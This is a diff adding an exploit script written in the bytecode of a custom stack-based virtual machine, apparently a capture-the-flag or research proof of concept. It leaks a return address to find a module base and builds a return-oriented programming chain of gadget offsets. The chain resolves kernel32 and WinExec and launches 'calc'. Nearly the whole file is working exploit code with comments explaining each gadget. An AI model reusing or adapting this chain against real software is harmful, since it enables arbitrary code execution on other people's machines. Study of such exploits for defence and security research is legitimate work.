@@ -1,0 +1,142 @@
+
+; I have 18 DWORDS on the stack. then a pointer i mustt touch, then whatever i want
+; so 9 QWORDS
+
+OP_PUSH_M       raw 0x11
+OP_PUSH         raw 0xFFFFFFFF
+OP_BITWISE_AND
+; stack: [orig retaddr]
+OP_PUSH         raw 0x38F2 ; offset of orig retaddr from base
+OP_INT_SUB
+OP_POP_M        raw 0 ; save base address to Mem
+; mem: [baseaddr], stack:[]
+
+; --------------------------------------------------------------------
+; end of init
+; --------------------------------------------------------------------
+
+
+; write QWORD 1 
+; add base to gadget offset
+OP_PUSH_M       raw 0
+OP_PUSH         raw 0x51108 ; :call GetModuleHandleExW
+OP_INT_ADD
+OP_PUSH         raw 2 ; GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT 
+
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x11
+
+
+
+; write QWORD 2
+OP_PUSH         wide "kernel32"
+OP_PUSH 		reloc 0 ; some random address here
+
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x12
+
+
+; write QWORD 3
+OP_PUSH 		reloc 0 ; will be put in ecx, used later to not crash
+OP_PUSH_M 		raw 0 
+OP_PUSH 		raw 0x5E29
+OP_INT_ADD
+
+OP_PUSH 		raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M		raw 0x13
+
+
+; write QWORD 4
+OP_PUSH         raw 0 ; junk in ebp 
+OP_PUSH_M 		raw 0 
+OP_PUSH 		raw 0x2a1ec ; offset to mov eax, [eax]; ret
+OP_INT_ADD
+
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M		raw 0x14 ; will put 0 in ebp
+
+
+; write QWORD 5
+
+OP_PUSH_M 		raw 0 ; BASE
+OP_PUSH 		raw 0x368ca ; offset to mov edx,eax;...; mov [ecx],edx; ret - ecx must be a valid pointer
+OP_INT_ADD
+OP_PUSH_M       raw 0
+OP_PUSH         raw   0x1a61 ; offset to pop ecx, ret   
+OP_INT_ADD
+
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x15
+
+
+
+; cant touch EDX
+; write QWORD 6: 
+
+OP_PUSH_M       raw 0
+OP_PUSH         raw 0xc9064 ; subtracted 44 hex to account for later gadget offset to getprogaddress address
+OP_INT_ADD
+OP_PUSH_M 		raw 0 
+OP_PUSH 		raw 0x37995
+OP_INT_ADD
+
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x16
+
+
+; write QWORD 7 - GetProcAddress + target proc
+OP_PUSH_M 		raw 0 
+OP_PUSH 		raw 0x4ca6d ; mov esp+4, edx ; (hmodule), jmp eax
+OP_INT_ADD
+OP_PUSH_M 		raw 0 
+OP_PUSH 		 raw 0x51115 ; :ret ; instead of: raw 0x101eb ; pop ebx, pop ebp; ret
+OP_INT_ADD
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x17 
+
+
+; write QWORD 8 
+; second arg for WinExec + ret address
+OP_PUSH         raw 0 ; leave room for handle
+OP_PUSH         ascii "WinExec"
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x18
+
+
+OP_PUSH_M 		raw 0 
+OP_PUSH         raw 0x101e4 ; call eax; 
+OP_INT_ADD
+OP_PUSH 		ascii "calc"
+OP_PUSH         raw 32
+OP_SHL
+OP_BITWISE_OR
+OP_POP_M       raw 0x19
+
+
+
+; --------------------------------------------------------------------
+; end of rop
+; --------------------------------------------------------------------
+
+OP_NOP
+OP_HALT
+; --------------------------------------------------------------------
+; end of code
+; --------------------------------------------------------------------
+
